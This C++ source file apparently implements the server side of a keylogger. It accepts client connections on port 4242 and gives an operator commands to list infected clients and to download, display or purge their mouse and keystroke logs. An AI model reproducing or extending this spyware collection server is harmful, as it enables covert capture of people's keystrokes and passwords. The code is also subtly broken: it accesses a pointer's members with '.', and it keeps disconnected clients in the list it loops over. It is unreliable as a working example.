#include <iostream>
#include <string>
#include <algorithm>
#include <functional>
#include <map>

#include "TCPServer.hpp"
#include "TCPClient.hpp"
#include "Protocol.hpp"
#include "parser.hpp"

int main(int argc, char **argv)
{
  TCPServer server;
  std::vector<TCPClient*> clientsList;
  char buffer[sizeof(t_cmd)];
  char cmd_buffer[255];
  Parser parser(server, clientsList);

  fcntl(0, F_SETFL, fcntl(0, F_GETFL) | O_NONBLOCK);
  server.listenClients("127.0.0.1", "4242", 3);
  std::cout << "Available commands:" << std::endl;
  std::cout << "LIST : List connected clients ID." << std::endl;
  std::cout << "DOWNLOAD_LOG [ID] : Download log for client ID." << std::endl;
  std::cout << "DISPLAY_LOG [ID] : Display mouse and keystroke log for client ID." << std::endl;
  std::cout << "PURGE_LOG [ID] : Delete log for client ID." << std::endl;
  std::cout << "CLOSE [ID] : Close client ID." << std::endl << std::endl;

  while (server.isListening())
    {
      parser.parseCommands();
      server.waitForClientsActivity();
      if (server.incomingConnection())
	{
	  TCPClient* client = server.getIncomingCLient();
	  clientsList.push_back(client);
	}
      for (auto clientIt = clientsList.begin(); clientIt != clientsList.end(); clientIt++)
	{
	  if (server.checkSocket(*clientIt))
	    {
	      int read = 0;
	      if ((read = ((*clientIt)->receiveData(buffer, sizeof(t_cmd)))) == 0)
		{
		  std::vector<TCPClient*> temp;
		  std::cout << "Client disconected" << std::endl;
		  server.disconectClient(*clientIt);
		  (*clientIt)->disconnectFromHost();
		}
	      else if (read > 0)
		{
		  if (read == sizeof(t_cmd))
		    {
		      t_cmd *command = reinterpret_cast<t_cmd *>(buffer);
		      if (command.cmd == commandType::DOWNLOAD_LOG)
			{
			  command.buffer[command.data_len] = '\0';
			  std::cout << command.buffer << std::endl;
			}
		    }
		}
	    }
	}
    }
  return (0);
}
